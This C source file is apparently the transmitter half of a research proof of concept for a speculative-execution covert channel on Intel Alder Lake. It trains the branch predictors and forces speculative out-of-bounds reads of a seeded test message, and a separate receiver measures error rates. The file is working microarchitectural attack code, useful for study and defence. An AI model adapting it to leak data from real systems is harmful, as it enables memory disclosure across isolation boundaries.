#include <errno.h>
#include <fcntl.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <x86intrin.h>

#include "message.h"

/* Clear the PHR (specifically designed for Intel Alder Lake processors) */
extern void clear_phr();
extern void shift_phr();
extern void set_phr(int input);

#define SECRET_VALUE 37

/* Cache Hit Threshold for Intel CPUs */
#define cache_hit_threshold 150

/* Number of iterations to train bpu. */
const size_t TRAINING = 128;

/* Number of samples (repeats of the entire attack). */
const size_t SAMPLE_COUNT = 100;

/* Victim Array */
uint8_t victim_array[64];

/* Victim Function's Boundary Check Value */
size_t VICTIM_COND = 32;

/* Probe Array */
#define PROBE_DIST 512
volatile uint8_t probe[256 * PROBE_DIST];

/********************************************************************
Helper Functions
********************************************************************/

typedef struct {
  size_t value;
  size_t index;
} IndexedValue;

/* Helper function for finding two largest values in an array */
void findTwoLargest(const size_t hits[], size_t size, IndexedValue *largest1,
                    IndexedValue *largest2) {
  *largest1 = (IndexedValue){0, 0};
  *largest2 = (IndexedValue){0, 0};
  for (size_t i = 0; i < size; ++i) {
    if (hits[i] > largest1->value) {
      largest2->value = largest1->value;
      largest2->index = largest1->index;
      largest1->value = hits[i];
      largest1->index = i;
    } else if (hits[i] > largest2->value) {
      largest2->value = hits[i];
      largest2->index = i;
    }
  }
}

/* Helper function for measuring the access time of ptr[index] */
uint64_t time_access(volatile void *ptr, size_t index) {
  ptr += index;
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  __asm__ __volatile__("" : : "r"(*(volatile char *)ptr));
  // ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

uint64_t time_access_dcache(volatile uint8_t *ptr, size_t index) {
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

/* Helper function for flushing the memory referenced by ptr */
void flush(volatile void *ptr, size_t length) {
  uint8_t *byte_ptr = (uint8_t *)ptr;

  // Align to cache line
  length += (uintptr_t)byte_ptr & 0x3F;
  byte_ptr = (uint8_t *)((uintptr_t)byte_ptr & ~0x3F);

  // Flush every cacheline
  for (size_t i = 0; i < length; i += 64) {
    // Optimized CLFLUSH instruction for Intel CPUs
    __asm__ __volatile__("clflushopt (%0)\n\t"
                         :
                         : "r"(byte_ptr + i)
                         : "memory");
  }

  _mm_lfence();
}

/********************************************************************
Victim Code
********************************************************************/
/* Spy Target 1 */
void __attribute__((aligned(64))) target_spy() {
  __asm__ __volatile__("pop %rbp\n\t"
                       ".rept 131072\n\t"
                       "ret\n\t"
                       ".endr\n\t");
}

/* Victim Function : Spy */
void __attribute__((aligned(64))) victim_spy(int input) {

  void (*spy_indirect_branch)();
  spy_indirect_branch = target_spy;

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(0);
  if (input < VICTIM_COND) {
    int offset = PROBE_DIST * victim_array[input];
    spy_indirect_branch += offset;
    spy_indirect_branch();
  }

  return;
}

/* Benign Target 0 */
void benign_target0() { return; }

/* Benign Target 1 */
void benign_target1() { return; }

/* Victim Function : Main */
void victim_function(int input) {

  void (*victim_indirect_branch)();
  if (input == 0)
    victim_indirect_branch = benign_target0;
  else
    victim_indirect_branch = benign_target1;

  _mm_clflush(&victim_indirect_branch);
  _mm_mfence();

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(input);

  __asm__ __volatile__(".rept 52\n\t"
                       "nop\n\t"
                       ".endr\n\t");
  victim_indirect_branch();

  return;
}

/********************************************************************
Main Function
********************************************************************/
/* Harness helpers are only declared here and defined below main(), so that
   no code is emitted ahead of the victim functions above.  See
   MEASUREMENT.md, "Code layout invariant". */
static void parse_args(int argc, const char **argv, size_t *msg_len,
                       size_t *repeat);
static void gen_message(uint8_t *buf, size_t len, uint32_t seed);
static int sem_wait_timeout(sem_t *sem, int seconds);
static double elapsed_sec(const struct timespec *a, const struct timespec *b);

int main(int argc, const char **argv) {

  size_t msg_len = MSG_LEN;
  size_t repeat = MSG_REPEAT;
  parse_args(argc, argv, &msg_len, &repeat);

  printf("\nPoC: Writer (transmitter)\n");
  printf("----------------------------\n");
  printf("payload      : %zu bytes (seed 0x%08x)\n", msg_len, MSG_SEED);
  printf("rounds/byte  : %zu\n", repeat);
  printf("total rounds : %zu\n", msg_len * repeat);
  fflush(stdout);

  /* Initialize Victim Array */
  for (size_t i = 0; i < 64; i++) {
    victim_array[i] = i;
  }

  uint8_t *msg = (uint8_t *)malloc(msg_len);
  if (msg == NULL) {
    perror("malloc");
    return 1;
  }
  gen_message(msg, msg_len, MSG_SEED);

  /* Start from a clean slate.  A named semaphore left behind by an aborted
     run keeps its old value, which would desynchronise the ping-pong. */
  sem_unlink("/sem1");
  sem_unlink("/sem2");
  sem_t *sem_1 = sem_open("/sem1", O_CREAT | O_EXCL, 0666, 1);
  sem_t *sem_2 = sem_open("/sem2", O_CREAT | O_EXCL, 0666, 0);
  if (sem_1 == SEM_FAILED || sem_2 == SEM_FAILED) {
    perror("sem_open");
    return 1;
  }

  size_t sent = 0;
  struct timespec t_start, t_end;
  clock_gettime(CLOCK_MONOTONIC, &t_start);

  for (size_t b = 0; b < msg_len; b++) {

    /* The byte to transmit is placed past the bounds check, so that the
       speculative load in victim_spy() is the thing that reads it. */
    victim_array[SECRET_INDEX] = msg[b];

    for (size_t r = 0; r < repeat; r++) {
      // Reset cache state (Flush)
      flush(target_spy, 256 * PROBE_DIST);
      if (sem_wait_timeout(sem_1, SYNC_TIMEOUT_SEC) != 0) {
        fprintf(stderr,
                "\n[writer] timed out waiting for the receiver "
                "(byte %zu, round %zu) - aborting\n",
                b, r);
        goto done;
      }
      _mm_mfence();

      // Step 1: Train CBP
      for (size_t k = 0; k < 100; k++) {
        victim_spy(0);
      }

      _mm_mfence();

      // Step 2: Train IBP for the victim function
      for (size_t k = 0; k < 10; k++)
        victim_function(k % 2);

      _mm_mfence();

      // Step 3: Speculatively update the IBP
      _mm_clflush(&VICTIM_COND);
      _mm_mfence();
      victim_spy(SECRET_INDEX);
      _mm_clflush(&VICTIM_COND);
      _mm_mfence();
      victim_spy(SECRET_INDEX);
      _mm_clflush(&VICTIM_COND);
      _mm_mfence();
      victim_spy(SECRET_INDEX);
      _mm_clflush(&VICTIM_COND);
      _mm_mfence();
      victim_spy(SECRET_INDEX);

      sem_post(sem_2);
    }
    sent = b + 1;
  }

done:
  clock_gettime(CLOCK_MONOTONIC, &t_end);
  printf("\ntransmitted %zu/%zu bytes in %.3f s\n", sent, msg_len,
         elapsed_sec(&t_start, &t_end));

  sem_close(sem_1);
  sem_close(sem_2);
  sem_unlink("/sem1");
  sem_unlink("/sem2");
  free(msg);

  return 0;
}

/********************************************************************
Harness Helpers (defined after main to preserve the code layout)
********************************************************************/
/* Accepts the key=value style used by the other run scripts in this tree,
   e.g. ./ibp_leakage_writer.out msg_len=1024 repeat=100 */
static void parse_args(int argc, const char **argv, size_t *msg_len,
                       size_t *repeat) {
  for (int i = 1; i < argc; i++) {
    const char *eq = strchr(argv[i], '=');
    if (eq == NULL) {
      fprintf(stderr, "warning: ignoring unrecognized option '%s'\n", argv[i]);
      continue;
    }
    size_t klen = (size_t)(eq - argv[i]);
    unsigned long value = strtoul(eq + 1, NULL, 0);
    if (klen == 7 && strncmp(argv[i], "msg_len", 7) == 0)
      *msg_len = (size_t)value;
    else if (klen == 6 && strncmp(argv[i], "repeat", 6) == 0)
      *repeat = (size_t)value;
    else
      fprintf(stderr, "warning: ignoring unrecognized option '%s'\n", argv[i]);
  }
}

/* Deterministic payload.  Transmitter and receiver derive the identical
   byte stream from the same seed, so the receiver knows the ground truth
   and can compute the bit error rate without any side path. */
static void gen_message(uint8_t *buf, size_t len, uint32_t seed) {
  uint32_t s = seed;
  for (size_t i = 0; i < len; i++) {
    s = s * 1103515245u + 12345u;
    buf[i] = (uint8_t)(s >> 16);
  }
}

/* sem_wait() that gives up instead of hanging forever if the peer dies or
   the two sides fall out of lockstep. */
static int sem_wait_timeout(sem_t *sem, int seconds) {
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  ts.tv_sec += seconds;
  while (sem_timedwait(sem, &ts) != 0) {
    if (errno == EINTR)
      continue;
    return -1;
  }
  return 0;
}

static double elapsed_sec(const struct timespec *a, const struct timespec *b) {
  return (double)(b->tv_sec - a->tv_sec) +
         (double)(b->tv_nsec - a->tv_nsec) / 1e9;
}
